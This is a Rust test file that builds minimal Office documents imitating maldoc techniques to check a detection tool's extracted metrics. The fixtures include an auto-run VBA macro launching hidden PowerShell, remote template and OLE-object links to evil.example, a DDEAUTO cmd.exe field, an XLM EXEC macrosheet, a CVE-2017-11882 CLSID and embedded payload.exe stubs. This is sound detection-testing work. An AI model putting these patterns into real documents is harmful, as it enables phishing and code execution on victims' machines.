//! Office documents end to end: the `office.*` facts and metrics traits read,
//! for every document shape the Office rules target, built in code.
//!
//! Each builder writes the smallest real container that carries one shape:
//! OLE2 property sets, CompObj, VBA projects, Ole10Native packages,
//! dangerous-CLSID storages, encrypted OOXML packages and Outlook messages;
//! OOXML template injection, external objects and frames, DDE fields and
//! XLM macrosheets. The assertions pin the keys traits use, so moving their
//! computation between cleave and filefacts cannot silently drop one.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::io::{Cursor, Write};
use std::path::Path;

use serde_json::Value;

// ---------------------------------------------------------------- OLE2 --

/// A compound file holding `streams`, creating parent storages on demand,
/// with `clsids` set on storages afterwards.
fn compound_file(streams: &[(&str, &[u8])], clsids: &[(&str, &str)]) -> Vec<u8> {
    let mut comp = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
    for (path, body) in streams {
        if let Some(parent) = Path::new(path).parent()
            && parent != Path::new("/")
        {
            comp.create_storage_all(parent).unwrap();
        }
        comp.create_stream(path).unwrap().write_all(body).unwrap();
    }
    for (path, clsid) in clsids {
        comp.create_storage_all(path).unwrap();
        comp.set_storage_clsid(path, uuid::Uuid::parse_str(clsid).unwrap())
            .unwrap();
    }
    comp.flush().unwrap();
    comp.into_inner().into_inner()
}

enum Prop {
    Str(&'static str),
    I4(i32),
}

/// A one-section MS-OLEPS property-set stream.
fn property_set(props: &[(u32, Prop)]) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&0xFFFE_u16.to_le_bytes()); // byte order
    out.extend_from_slice(&0_u16.to_le_bytes()); // version
    out.extend_from_slice(&[0; 4]); // system identifier
    out.extend_from_slice(&[0; 16]); // CLSID
    out.extend_from_slice(&1_u32.to_le_bytes()); // one section
    out.extend_from_slice(&[0; 16]); // FMTID
    out.extend_from_slice(&48_u32.to_le_bytes()); // section offset
    let table = 8 + props.len() * 8;
    let mut entries = Vec::new();
    let mut blob = Vec::new();
    for (pid, value) in props {
        entries.extend_from_slice(&pid.to_le_bytes());
        entries.extend_from_slice(&u32::try_from(table + blob.len()).unwrap().to_le_bytes());
        match value {
            Prop::Str(s) => {
                blob.extend_from_slice(&0x1E_u32.to_le_bytes()); // VT_LPSTR
                blob.extend_from_slice(&u32::try_from(s.len() + 1).unwrap().to_le_bytes());
                blob.extend_from_slice(s.as_bytes());
                blob.push(0);
            }
            Prop::I4(v) => {
                blob.extend_from_slice(&0x03_u32.to_le_bytes()); // VT_I4
                blob.extend_from_slice(&v.to_le_bytes());
            }
        }
        while blob.len() % 4 != 0 {
            blob.push(0);
        }
    }
    let size = u32::try_from(table + blob.len()).unwrap();
    out.extend_from_slice(&size.to_le_bytes());
    out.extend_from_slice(&u32::try_from(props.len()).unwrap().to_le_bytes());
    out.extend_from_slice(&entries);
    out.extend_from_slice(&blob);
    out
}

/// A `\x01CompObj` body: header, AnsiUserType, no clipboard format, ProgID.
fn compobj(user_type: &str, prog_id: &str) -> Vec<u8> {
    let mut body = vec![0; 28];
    for s in [user_type, ""] {
        if s.is_empty() {
            body.extend_from_slice(&0_u32.to_le_bytes());
            continue;
        }
        body.extend_from_slice(&u32::try_from(s.len() + 1).unwrap().to_le_bytes());
        body.extend_from_slice(s.as_bytes());
        body.push(0);
    }
    body.extend_from_slice(&u32::try_from(prog_id.len() + 1).unwrap().to_le_bytes());
    body.extend_from_slice(prog_id.as_bytes());
    body.push(0);
    body
}

/// MS-OVBA "compression" of `data` as one chunk of literal tokens.
fn ovba_compress(data: &[u8]) -> Vec<u8> {
    assert!(
        data.len() <= 3600,
        "one literal chunk holds at most 3640 bytes"
    );
    let mut tokens = Vec::new();
    for group in data.chunks(8) {
        tokens.push(0); // every token in the group is a literal
        tokens.extend_from_slice(group);
    }
    let header = 0xB000_u16 | u16::try_from(tokens.len() + 2 - 3).unwrap();
    let mut out = vec![0x01];
    out.extend_from_slice(&header.to_le_bytes());
    out.extend_from_slice(&tokens);
    out
}

/// The `VBA/dir` stream (uncompressed) for `modules`, each read from offset 0.
fn vba_dir(modules: &[&str]) -> Vec<u8> {
    let mut d = Vec::new();
    let rec = |d: &mut Vec<u8>, id: u16, body: &[u8]| {
        d.extend_from_slice(&id.to_le_bytes());
        d.extend_from_slice(&u32::try_from(body.len()).unwrap().to_le_bytes());
        d.extend_from_slice(body);
    };
    rec(&mut d, 0x0001, &1_u32.to_le_bytes()); // SYSKIND
    rec(&mut d, 0x0002, &0x0409_u32.to_le_bytes()); // LCID
    rec(&mut d, 0x0003, &0x04E4_u16.to_le_bytes()); // CODEPAGE
    rec(&mut d, 0x0004, b"Project"); // NAME
    d.extend_from_slice(&0x0009_u16.to_le_bytes()); // VERSION: size 4, 6 bytes
    d.extend_from_slice(&4_u32.to_le_bytes());
    d.extend_from_slice(&[0; 6]);
    rec(
        &mut d,
        0x000F,
        &u16::try_from(modules.len()).unwrap().to_le_bytes(),
    ); // MODULES
    rec(&mut d, 0x0013, &0_u16.to_le_bytes()); // PROJECTCOOKIE
    for name in modules {
        rec(&mut d, 0x0019, name.as_bytes()); // MODULENAME
        rec(&mut d, 0x001A, name.as_bytes()); // MODULESTREAMNAME
        rec(&mut d, 0x0031, &0_u32.to_le_bytes()); // MODULEOFFSET
        rec(&mut d, 0x0021, &[]); // MODULETYPE: procedural
        rec(&mut d, 0x002B, &[]); // MODULE terminator
    }
    rec(&mut d, 0x0010, &[]); // PROJECT terminator
    d
}

/// The VBA storage streams for `modules` (name, source) under `prefix`.
fn vba_streams(prefix: &str, modules: &[(&str, &str)]) -> Vec<(String, Vec<u8>)> {
    let names: Vec<&str> = modules.iter().map(|(n, _)| *n).collect();
    let mut streams = vec![
        (
            format!("{prefix}/_VBA_PROJECT"),
            vec![0xCC, 0x61, 0xFF, 0xFF, 0x00, 0x00, 0x00],
        ),
        (format!("{prefix}/dir"), ovba_compress(&vba_dir(&names))),
    ];
    for (name, source) in modules {
        streams.push((format!("{prefix}/{name}"), ovba_compress(source.as_bytes())));
    }
    streams
}

const MACRO_SOURCE: &str = "Attribute VB_Name = \"Module1\"\r\n\
Private Declare PtrSafe Function URLDownloadToFileA Lib \"urlmon\" (ByVal a As LongPtr, ByVal b As String, ByVal c As String, ByVal d As Long, ByVal e As LongPtr) As Long\r\n\
Sub AutoOpen()\r\n\
    ' fetch and run\r\n\
    Dim sh As Object\r\n\
    Set sh = CreateObject(\"WScript.Shell\")\r\n\
    sh.Run \"powershell -nop -w hidden -c iex\", 0\r\n\
End Sub\r\n\
Sub Document_Open()\r\n\
    AutoOpen\r\n\
End Sub\r\n";

const RANDOM_MODULE_SOURCE: &str = "Attribute VB_Name = \"xKpL7m8sWq\"\r\n\
Function zqpx(k As String) As String\r\n\
    zqpx = StrReverse(k)\r\n\
End Function\r\n";

/// A compound file with the streams of `streams`, borrowed.
fn compound_file_owned(streams: &[(String, Vec<u8>)], clsids: &[(&str, &str)]) -> Vec<u8> {
    let borrowed: Vec<(&str, &[u8])> = streams
        .iter()
        .map(|(p, b)| (p.as_str(), b.as_slice()))
        .collect();
    compound_file(&borrowed, clsids)
}

/// A minimal PE: `MZ`, `e_lfanew`, `PE\0\0` and a COFF header.
fn tiny_pe() -> Vec<u8> {
    let mut pe = vec![0; 0x200];
    pe[0] = b'M';
    pe[1] = b'Z';
    pe[0x3C] = 0x80;
    pe[0x80..0x84].copy_from_slice(b"PE\0\0");
    pe[0x84..0x86].copy_from_slice(&0x014C_u16.to_le_bytes()); // i386
    pe
}

fn summary_doc() -> Vec<u8> {
    let summary = property_set(&[
        (0x02, Prop::Str("Invoice 4471")),
        (0x03, Prop::Str("Payment overdue")),
        (0x04, Prop::Str("Иван Иванов")),
        (0x05, Prop::Str("invoice payment")),
        (0x06, Prop::Str("open to view")),
        (0x07, Prop::Str("Normal.dotm")),
        (0x08, Prop::Str("admin")),
        (0x09, Prop::Str("7")),
        (0x12, Prop::Str("Microsoft Office Word")),
        (0x13, Prop::I4(1)),
    ]);
    let doc_summary = property_set(&[(0x0F, Prop::Str("Contoso Ltd")), (0x0E, Prop::Str("Eve"))]);
    compound_file(
        &[
            ("/WordDocument", &[0xEC, 0xA5, 0xC1, 0x00]),
            ("/\x05SummaryInformation", &summary),
            ("/\x05DocumentSummaryInformation", &doc_summary),
            (
                "/\x01CompObj",
                &compobj("Microsoft Word 97-2003 Document", "Word.Document.8"),
            ),
        ],
        &[],
    )
}

fn macro_doc() -> Vec<u8> {
    let mut streams = vec![("/WordDocument".to_string(), vec![0xEC, 0xA5, 0xC1, 0x00])];
    streams.extend(vba_streams(
        "/Macros/VBA",
        &[
            ("Module1", MACRO_SOURCE),
            ("xKpL7m8sWq", RANDOM_MODULE_SOURCE),
        ],
    ));
    compound_file_owned(&streams, &[])
}

fn objects_doc() -> Vec<u8> {
    // Ole10Native: total size, flags, label, source path, then the
    // temp-path block and the payload.
    let pe = tiny_pe();
    let mut native = Vec::new();
    let mut body = Vec::new();
    body.extend_from_slice(&2_u16.to_le_bytes());
    for s in ["payload.exe", "C:\\Users\\Public\\payload.exe"] {
        body.extend_from_slice(s.as_bytes());
        body.push(0);
    }
    body.extend_from_slice(&0_u16.to_le_bytes());
    body.extend_from_slice(&3_u16.to_le_bytes());
    let temp = b"C:\\Users\\Public\\AppData\\Local\\Temp\\payload.exe\0";
    body.extend_from_slice(&u32::try_from(temp.len()).unwrap().to_le_bytes());
    body.extend_from_slice(temp);
    body.extend_from_slice(&u32::try_from(pe.len()).unwrap().to_le_bytes());
    body.extend_from_slice(&pe);
    native.extend_from_slice(&u32::try_from(body.len()).unwrap().to_le_bytes());
    native.extend_from_slice(&body);
    compound_file(
        &[
            ("/WordDocument", &[0xEC, 0xA5, 0xC1, 0x00]),
            ("/ObjectPool/_1000/\x01Ole10Native", &native),
            ("/ObjectPool/_2000/Equation Native", &[0; 32]),
        ],
        // Equation Editor 3.0 (CVE-2017-11882).
        &[("/ObjectPool/_2000", "0002ce02-0000-0000-c000-000000000046")],
    )
}

fn encrypted_docx() -> Vec<u8> {
    // An encrypted OOXML package is a compound file holding the
    // encryption header and the encrypted ZIP.
    let mut info = vec![4, 0, 4, 0, 0x40, 0, 0, 0]; // agile 4.4
    info.extend_from_slice(b"<?xml version=\"1.0\"?><encryption/>");
    compound_file(
        &[
            ("/EncryptionInfo", &info),
            ("/EncryptedPackage", &[0x55; 64]),
        ],
        &[],
    )
}

fn utf16(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(u16::to_le_bytes).collect()
}

fn message_with_attachment() -> Vec<u8> {
    let attachment = "/__attach_version1.0_#00000000";
    compound_file_owned(
        &[
            ("/__properties_version1.0".into(), vec![0; 32]),
            ("/__substg1.0_0037001F".into(), utf16("Your invoice")),
            ("/__substg1.0_1000001F".into(), utf16("See attached.")),
            (format!("{attachment}/__properties_version1.0"), vec![0; 8]),
            (
                format!("{attachment}/__substg1.0_3707001F"),
                utf16("invoice.exe"),
            ),
            (format!("{attachment}/__substg1.0_37010102"), tiny_pe()),
        ],
        &[],
    )
}

// ---------------------------------------------------------------- OOXML --

const CONTENT_TYPES_DOCX: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"#;

const ROOT_RELS_DOCX: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>
</Relationships>"#;

const CORE: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <dc:creator>Иван Иванов</dc:creator>
  <cp:lastModifiedBy>admin</cp:lastModifiedBy>
  <dc:title>Invoice 4471</dc:title>
</cp:coreProperties>"#;

const APP: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <Application>Microsoft Office Word</Application>
  <Company>Contoso Ltd</Company>
</Properties>"#;

const REL: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

fn zip_of(parts: &[(&str, &[u8])]) -> Vec<u8> {
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);
    for (name, body) in parts {
        zip.start_file(*name, opts).unwrap();
        zip.write_all(body).unwrap();
    }
    zip.finish().unwrap().into_inner()
}

fn rels(entries: &[(&str, &str, &str, bool)]) -> String {
    let mut out = String::from(
        r#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">"#,
    );
    for (id, kind, target, external) in entries {
        let mode = if *external {
            r#" TargetMode="External""#
        } else {
            ""
        };
        out.push_str(&format!(
            r#"<Relationship Id="{id}" Type="{REL}/{kind}" Target="{target}"{mode}/>"#
        ));
    }
    out.push_str("</Relationships>");
    out
}

fn docx(document: &str, extra: &[(&str, &[u8])]) -> Vec<u8> {
    let mut parts: Vec<(&str, &[u8])> = vec![
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("_rels/.rels", ROOT_RELS_DOCX.as_bytes()),
        ("word/document.xml", document.as_bytes()),
        ("docProps/core.xml", CORE.as_bytes()),
        ("docProps/app.xml", APP.as_bytes()),
    ];
    parts.extend_from_slice(extra);
    zip_of(&parts)
}

const PLAIN_BODY: &str = r#"<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Invoice</w:t></w:r></w:p></w:body></w:document>"#;

fn template_injection_docx() -> Vec<u8> {
    let settings_rels = rels(&[(
        "rId9",
        "attachedTemplate",
        "http://evil.example/template.dotm",
        true,
    )]);
    docx(
        PLAIN_BODY,
        &[
            ("word/settings.xml", br#"<?xml version="1.0"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:attachedTemplate r:id="rId9" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></w:settings>"#),
            ("word/_rels/settings.xml.rels", settings_rels.as_bytes()),
        ],
    )
}

fn external_objects_docx() -> Vec<u8> {
    let document_rels = rels(&[
        ("rId5", "oleObject", "http://evil.example/payload.rtf", true),
        ("rId6", "image", "http://tracker.example/pixel.png", true),
        ("rId7", "hyperlink", "https://contoso.example/terms", true),
    ]);
    let web_rels = rels(&[("rId1", "frame", "http://evil.example/frame.html", true)]);
    let body = r#"<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:fldSimple w:instr="DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot;"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:body></w:document>"#;
    docx(
        body,
        &[
            ("word/_rels/document.xml.rels", document_rels.as_bytes()),
            ("word/webSettings.xml", br#"<?xml version="1.0"?><w:webSettings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>"#),
            ("word/_rels/webSettings.xml.rels", web_rels.as_bytes()),
        ],
    )
}

fn macro_docm() -> Vec<u8> {
    let project = compound_file_owned(
        &vba_streams(
            "/VBA",
            &[
                ("Module1", MACRO_SOURCE),
                ("xKpL7m8sWq", RANDOM_MODULE_SOURCE),
            ],
        ),
        &[],
    );
    let types = CONTENT_TYPES_DOCX.replace(
        "</Types>",
        r#"<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>"#,
    );
    let document_rels = rels(&[("rId1", "vbaProject", "vbaProject.bin", false)]);
    zip_of(&[
        ("[Content_Types].xml", types.as_bytes()),
        ("_rels/.rels", ROOT_RELS_DOCX.as_bytes()),
        ("word/document.xml", PLAIN_BODY.as_bytes()),
        ("word/_rels/document.xml.rels", document_rels.as_bytes()),
        ("word/vbaProject.bin", &project),
        ("docProps/core.xml", CORE.as_bytes()),
        ("docProps/app.xml", APP.as_bytes()),
    ])
}

fn xlm_xlsm() -> Vec<u8> {
    let types = r#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="png" ContentType="image/png"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
</Types>"#;
    let root_rels = rels(&[("rId1", "officeDocument", "xl/workbook.xml", false)]);
    let workbook = r#"<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    <sheet name="Macro1" sheetId="2" state="veryHidden" r:id="rId2"/>
  </sheets>
  <definedNames><definedName name="_xlnm.Auto_open" hidden="1">Macro1!$A$1</definedName></definedNames>
</workbook>"#;
    let workbook_rels = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{REL}/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/></Relationships>"#
    );
    let macrosheet = r#"<?xml version="1.0" encoding="UTF-8"?>
<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
  <sheetData>
    <row r="1"><c r="A1"><f>EXEC("cmd /c calc")</f></c></row>
    <row r="2"><c r="A2"><f>RUN(A5)</f></c></row>
    <row r="3"><c r="A3"><f>CHAR(65)&amp;CHAR(66)</f></c></row>
    <row r="4"><c r="A4"><f>GET.CELL(1)</f></c></row>
    <row r="5"><c r="A5"><f>IF(DAY(NOW())&gt;1,HALT())</f></c></row>
    <row r="6"><c r="A6"><f>FORMULA.FILL("x",B1)</f></c></row>
  </sheetData>
</xm:macrosheet>"#;
    let sheet = r#"<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>"#;
    let png = [0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0];
    zip_of(&[
        ("[Content_Types].xml", types.as_bytes()),
        ("_rels/.rels", root_rels.as_bytes()),
        ("xl/workbook.xml", workbook.as_bytes()),
        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
        ("xl/worksheets/sheet1.xml", sheet.as_bytes()),
        ("xl/macrosheets/sheet1.xml", macrosheet.as_bytes()),
        ("xl/media/image1.png", &png),
        ("xl/embeddings/payload.exe", &tiny_pe()),
    ])
}

// ---------------------------------------------------------------- harness --

struct Facts {
    metrics: serde_json::Map<String, Value>,
    values: serde_json::Map<String, Value>,
}

fn cleave(args: &[&str]) -> Value {
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("CLEAVE_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(args)
        .output()
        .expect("run cleave");
    assert!(
        output.status.success(),
        "cleave {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    serde_json::from_slice(&output.stdout).expect("cleave json")
}

/// Every metric and value cleave reports for `bytes` named `name`.
fn facts(name: &str, bytes: &[u8]) -> Facts {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join(name);
    std::fs::write(&path, bytes).unwrap();
    let path = path.to_str().unwrap();
    let metrics = match cleave(&["metrics", "--format", "json", path]) {
        Value::Object(map) => map,
        other => panic!("metrics: {other}"),
    };
    let values = cleave(&["--json", "value", path])
        .as_array()
        .expect("value entries")
        .iter()
        .map(|e| (e["path"].as_str().unwrap().to_string(), e["value"].clone()))
        .collect();
    Facts { metrics, values }
}

#[test]
#[ignore = "prints the facts of every fixture; run with --ignored --nocapture"]
fn dump_office_document_facts() {
    for (name, bytes) in [
        ("summary.doc", summary_doc()),
        ("macro.doc", macro_doc()),
        ("objects.doc", objects_doc()),
        ("encrypted.docx", encrypted_docx()),
        ("invoice.msg", message_with_attachment()),
        ("template.docx", template_injection_docx()),
        ("external.docx", external_objects_docx()),
        ("macro.docm", macro_docm()),
        ("xlm.xlsm", xlm_xlsm()),
    ] {
        // `OFFICE_FIXTURE_DIR=<dir>` also keeps each document for inspection.
        if let Some(dir) = std::env::var_os("OFFICE_FIXTURE_DIR") {
            std::fs::write(Path::new(&dir).join(name), &bytes).unwrap();
        }
        let facts = facts(name, &bytes);
        println!("=== {name}");
        for (k, v) in facts
            .metrics
            .iter()
            .filter(|(k, _)| k.starts_with("office"))
        {
            println!("  metric {k} = {v}");
        }
        for (k, v) in facts.values.iter().filter(|(k, _)| k.starts_with("office")) {
            println!("  value  {k} = {v}");
        }
    }
}

fn metric(facts: &Facts, key: &str) -> f64 {
    facts
        .metrics
        .get(key)
        .and_then(Value::as_f64)
        .unwrap_or_else(|| {
            panic!(
                "metric {key} missing: {:?}",
                facts.metrics.keys().collect::<Vec<_>>()
            )
        })
}

fn value<'a>(facts: &'a Facts, key: &str) -> &'a Value {
    facts.values.get(key).unwrap_or_else(|| {
        panic!(
            "value {key} missing: {:?}",
            facts.values.keys().collect::<Vec<_>>()
        )
    })
}

#[test]
fn legacy_document_properties() {
    let facts = facts("summary.doc", &summary_doc());
    for (key, want) in [
        ("office.title", "Invoice 4471"),
        ("office.subject", "Payment overdue"),
        ("office.creator", "Иван Иванов"),
        ("office.keywords", "invoice payment"),
        ("office.description", "open to view"),
        ("office.template", "Normal.dotm"),
        ("office.last_modified_by", "admin"),
        ("office.revision", "7"),
        ("office.application", "Microsoft Office Word"),
        // DocumentSummaryInformation, at the PIDs Office writes.
        ("office.company", "Contoso Ltd"),
        ("office.manager", "Eve"),
        ("office.compobj.prog_id", "Word.Document.8"),
        (
            "office.compobj.user_type",
            "Microsoft Word 97-2003 Document",
        ),
        ("office.kind", "doc"),
    ] {
        assert_eq!(value(&facts, key), want, "{key}");
    }
    assert_eq!(value(&facts, "office.document_security"), 1);
}

#[test]
fn legacy_vba_project() {
    let facts = facts("macro.doc", &macro_doc());
    assert_eq!(metric(&facts, "office.vba.module_count"), 2.0);
    assert_eq!(metric(&facts, "office.vba.total_logical_lines"), 15.0);
    assert_eq!(metric(&facts, "office.vba.declare_count"), 1.0);
    assert_eq!(metric(&facts, "office.vba.createobject_count"), 1.0);
    assert_eq!(metric(&facts, "office.vba.distinct_trigger_count"), 2.0);
    assert_eq!(value(&facts, "office.vba.modules[1].name"), "xKpL7m8sWq");
    assert_eq!(metric(&facts, "office.vba.random_named_module_count"), 1.0);
}

#[test]
fn packaged_executable_and_dangerous_clsid() {
    let facts = facts("objects.doc", &objects_doc());
    assert_eq!(metric(&facts, "office.embedded_executable_count"), 1.0);
    assert_eq!(value(&facts, "office.embedded[0].filename"), "payload.exe");
    assert_eq!(value(&facts, "office.embedded[0].kind"), "pe");
    assert_eq!(value(&facts, "office.embedded[0].size_bytes"), 512);
    assert_eq!(metric(&facts, "office.dangerous_clsid_count"), 1.0);
    assert_eq!(
        value(&facts, "office.dangerous_clsids[0].clsid"),
        "0002ce02-0000-0000-c000-000000000046"
    );
}

#[test]
fn encrypted_package() {
    let facts = facts("encrypted.docx", &encrypted_docx());
    assert_eq!(metric(&facts, "office.is_encrypted"), 1.0);
}

#[test]
fn message_attachment() {
    let facts = facts("invoice.msg", &message_with_attachment());
    assert_eq!(value(&facts, "office.kind"), "msg");
    assert_eq!(
        value(&facts, "office.msg.attachments[0].filename"),
        "invoice.exe"
    );
    assert_eq!(metric(&facts, "office.embedded_executable_count"), 1.0);
}

#[test]
fn remote_template() {
    let facts = facts("template.docx", &template_injection_docx());
    assert_eq!(metric(&facts, "office.external_relationship_count"), 1.0);
    assert_eq!(
        value(&facts, "office.external_relationships[0].type"),
        "attachedTemplate"
    );
    assert_eq!(
        value(&facts, "office.external_relationships[0].target"),
        "http://evil.example/template.dotm"
    );
    assert_eq!(value(&facts, "office.company"), "Contoso Ltd");
}

#[test]
fn remote_objects_frames_and_dde() {
    let facts = facts("external.docx", &external_objects_docx());
    assert_eq!(metric(&facts, "office.external_relationship_count"), 4.0);
    assert_eq!(metric(&facts, "office.external_oleobject_count"), 1.0);
    assert_eq!(metric(&facts, "office.external_frame_count"), 1.0);
    assert_eq!(metric(&facts, "office.dde_link_count"), 1.0);
    assert!(
        value(&facts, "office.dde_links[0].text")
            .as_str()
            .is_some_and(|t| t.starts_with("DDEAUTO"))
    );
}

#[test]
fn macro_enabled_document() {
    let facts = facts("macro.docm", &macro_docm());
    assert_eq!(value(&facts, "office.macros[0]"), "word/vbaProject.bin");
    assert_eq!(metric(&facts, "office.vba.module_count"), 2.0);
    assert_eq!(metric(&facts, "office.vba.total_logical_lines"), 15.0);
    assert_eq!(metric(&facts, "office.vba.random_named_module_count"), 1.0);
}

#[test]
fn xlm_macrosheet_workbook() {
    let facts = facts("xlm.xlsm", &xlm_xlsm());
    for (key, want) in [
        ("office.xlm.very_hidden_sheet_count", 1.0),
        ("office.xlm.run_count", 1.0),
        ("office.xlm.char_count", 2.0),
        ("office.xlm.get_cell_count", 1.0),
        ("office.xlm.day_now_count", 1.0),
        ("office.xlm.formula_fill_count", 1.0),
        ("office.ooxml.image_part_count", 1.0),
        ("office.ooxml.suspicious_extension_count", 1.0),
        ("office.embedded_executable_count", 1.0),
    ] {
        assert_eq!(metric(&facts, key), want, "{key}");
    }
    assert!(metric(&facts, "office.ooxml.max_entry_size") > 0.0);
    assert_eq!(value(&facts, "office.sheet_names[1]"), "Macro1");
    assert_eq!(value(&facts, "office.names[0]"), "_xlnm.Auto_open");
    assert_eq!(
        value(&facts, "office.embedded[0].filename"),
        "xl/embeddings/payload.exe"
    );
}
